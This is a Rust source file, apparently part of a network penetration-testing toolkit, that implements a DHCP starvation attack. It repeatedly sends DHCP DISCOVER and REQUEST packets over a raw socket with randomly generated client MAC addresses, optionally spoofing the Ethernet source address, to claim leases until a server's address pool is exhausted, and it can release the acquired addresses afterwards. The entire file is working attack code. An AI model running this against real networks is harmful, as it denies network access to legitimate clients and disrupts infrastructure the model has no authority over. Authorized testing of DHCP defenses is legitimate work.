use crate::release;
use crate::{
    args,
    dhcp::{self, DhcpMessageTypes, DhcpPacket},
    transport::TransportChannel,
};
use log::{debug, info};
use pnet::util::MacAddr;
use rand::Rng;
use std::{
    net::Ipv4Addr,
    sync::{
        atomic::{AtomicBool, Ordering},
        Arc,
    },
};

pub fn main(args: args::starvation::Arguments) -> Result<(), String> {
    let iface = &args.iface;

    let my_mac = iface.mac.ok_or_else(|| {
        format!("Unable to get the MAC of {} interface", iface.name)
    })?;

    let mut channel = TransportChannel::new(iface, Some(args.timeout))
        .map_err(|e| format!("Unable to create a raw socket: {}", e))?;

    let running = Arc::new(AtomicBool::new(true));
    let run_c = running.clone();

    ctrlc::set_handler(move || {
        run_c.store(false, Ordering::SeqCst);
    })
    .expect("Error setting Ctrl-C handler");

    let mut acquired = Vec::new();

    while running.load(Ordering::SeqCst) {
        let dhcp_mac = random_mac();

        let ether_mac = match args.keep_ether {
            true => my_mac,
            false => dhcp_mac,
        };

        match discover(&mut channel, dhcp_mac, ether_mac, args.servers.as_ref())
        {
            Ok(resp) => {
                let client_ip = resp.yiaddr;
                let client_mac = resp.chaddr;
                println!("{} {}", client_ip, client_mac);
                if let Some(server_ip) = resp.dhcp_server_id() {
                    acquired.push((server_ip, client_ip, client_mac));
                }
            }
            Err(e) => {
                info!("{}", e);
            }
        }
    }

    if args.release {
        info!("Releasing acquired IPs...");
        for (server_ip, client_ip, client_mac) in acquired {
            let ether_mac = match args.keep_ether {
                true => my_mac,
                false => client_mac,
            };
            release::send_release(
                &mut channel,
                client_ip,
                server_ip,
                client_mac,
                ether_mac,
            )?;
        }
    }

    return Ok(());
}

fn random_mac() -> MacAddr {
    let mut rng = rand::thread_rng();
    return MacAddr::new(
        rng.gen(),
        rng.gen(),
        rng.gen(),
        rng.gen(),
        rng.gen(),
        rng.gen(),
    );
}

fn discover(
    channel: &mut TransportChannel,
    dhcp_mac: MacAddr,
    ether_mac: MacAddr,
    server_ips: Option<&Vec<Ipv4Addr>>,
) -> Result<DhcpPacket, String> {
    let mut rng = rand::thread_rng();
    let transaction_id: u32 = rng.gen();

    let mut dp = DhcpPacket::new_request();
    dp.add_dhcp_msg_type(DhcpMessageTypes::DISCOVER);
    dp.xid = transaction_id;
    dp.chaddr = dhcp_mac;

    send_broadcast(channel, ether_mac, &dp)?;

    debug!("DISCOVER sent - Client MAC {}", dhcp_mac);

    let (_, dhcp_resp) = channel.recv_dhcp(
        dhcp::DHCP_CLIENT_PORT,
        &[DhcpMessageTypes::OFFER],
        Some(transaction_id),
        server_ips,
    )?;

    let client_ip = dhcp_resp.yiaddr;
    debug!("OFFER received - Offered IP: {}", client_ip);

    let dhcp_server = dhcp_resp
        .dhcp_server_id()
        .ok_or(format!("Unable to get the server ip"))?;

    let mut dp = DhcpPacket::new_request();
    dp.add_dhcp_msg_type(DhcpMessageTypes::REQUEST);
    dp.xid = transaction_id;
    dp.chaddr = dhcp_mac;
    dp.add_requested_ip_address(client_ip);
    dp.add_dhcp_server_id(dhcp_server);

    send_broadcast(channel, ether_mac, &dp)?;

    debug!("REQUEST sent - Client MAC: {}", dhcp_mac);

    let (_, dhcp_resp) = channel.recv_dhcp(
        dhcp::DHCP_CLIENT_PORT,
        &[DhcpMessageTypes::ACK, DhcpMessageTypes::NAK],
        Some(transaction_id),
        Some(&vec![dhcp_server]),
    )?;

    match dhcp_resp.dhcp_msg_type().unwrap() {
        DhcpMessageTypes::ACK => {
            return Ok(dhcp_resp);
        }
        DhcpMessageTypes::NAK => match dhcp_resp.message() {
            Some(msg) => {
                return Err(format!("NAK received - Message: {}", msg));
            }
            None => {
                return Err(format!("NAK received"));
            }
        },
        _ => unreachable!("Unknown message"),
    }
}

fn send_broadcast(
    channel: &mut TransportChannel,
    ether_mac: MacAddr,
    dp: &DhcpPacket,
) -> Result<(), String> {
    channel
        .build_and_send(
            ether_mac,
            Ipv4Addr::UNSPECIFIED,
            dhcp::DHCP_CLIENT_PORT,
            MacAddr::broadcast(),
            Ipv4Addr::BROADCAST,
            dhcp::DHCP_SERVER_PORT,
            &dp.build(),
        )
        .ok_or("Error sending packet")?
        .map_err(|e| format!("Error sending packet: {}", e))?;

    return Ok(());
}
